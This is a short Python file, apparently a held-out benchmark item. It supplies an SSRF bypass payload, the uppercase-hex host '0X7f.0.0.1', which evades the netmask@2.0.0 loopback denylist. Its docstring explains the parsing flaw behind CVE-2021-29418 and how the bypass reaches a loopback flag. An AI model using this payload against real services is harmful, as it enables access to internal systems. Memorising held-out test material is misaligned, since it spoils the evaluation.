#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-29418 residual exploit -- the incomplete-fix bypass of netmask@2.0.0.

Uppercase-hex IPv4 notation for loopback: 0X7f.0.0.1 == 0x7f.0.0.1 == 127.0.0.1. The V1 guard
(netmask@2.0.0, the CVE-2021-28918 fix) still misclassifies this form as PUBLIC:
  - ip2long's octet decode only recognises a hex marker via `byte[1]==='x' || byte[1]==='x'` -- a
    verbatim typo in the 2.0.0 source (the second test should be 'X'), so an UPPERCASE 0X is never
    taken as hex;
  - it therefore falls through to the octal branch, parseInt('0X7f', 8) === 0 (the 'X' stops the
    scan), so 0X7f.0.0.1 is decoded as 0.0.0.1;
  - 0.0.0.1 is not inside the guard's internal-range denylist {127/8, 10/8, 172.16/12, 192.168/16,
    169.254/16}, so the guard ADMITS it.
=> new Netmask('127.0.0.0/8').contains('0X7f.0.0.1') === false on V1, the guard admits it, and the
outbound fetch to http://0X7f.0.0.1/ reaches the loopback ${PCB_FLAG} (undici routes the raw string
to 127.0.0.1; verified on node:20-slim). This is the CVE-2021-29418 class of "unexpected characters
in an IP address string" that netmask before 2.0.1 mishandles. netmask@2.0.1 rewrote ip2long/atob to
handle 0x/0X and reject stray chars, so it decodes 0X7f.0.0.1 as 127.0.0.1 and BLOCKS it.
"""


def candidate():
    return {
        "host": "0X7f.0.0.1",
        "probe_id": "residual-cve-2021-29418-uppercase-hex-loopback",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
